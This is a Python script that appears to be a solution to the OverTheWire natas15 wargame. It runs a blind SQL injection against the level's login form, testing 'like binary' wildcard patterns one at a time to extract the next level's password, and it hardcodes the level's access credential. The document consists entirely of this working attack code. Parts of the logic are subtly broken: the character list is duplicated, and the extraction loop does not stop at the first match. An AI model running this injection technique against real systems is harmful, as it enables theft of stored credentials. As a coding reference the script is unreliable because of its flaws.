import requests
from requests.auth import HTTPBasicAuth

url = "http://natas15.natas.labs.overthewire.org/index.php"
l = "acehijmnpqtwBEHINORW03569"
c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

for i in range(len(c)):
	u = "%" + c[i] + "%"
	u = 'natas16" and password like binary "' + u
	data = {"username": u}
	r = requests.post(url, auth=HTTPBasicAuth("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"), data=data)
	assert(r.status_code == 200)
	if 'exists' in r.text:
		l += c[i]
		print(u)

p = ""
for i in range(32):
	for i in range(len(l)):
		u = p + l[i] + "%"
		u = 'natas16" and password like binary "' + u
		data = {"username": u}
		r = requests.post(url, auth=HTTPBasicAuth("natas15", "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"), data=data)
		assert(r.status_code == 200)
		print(u)
		if 'exists' in r.text:
			p += l[i]
			print(">>>" + u)
			continue

print(p)
# print(type(r))
# print(r)
# print(l)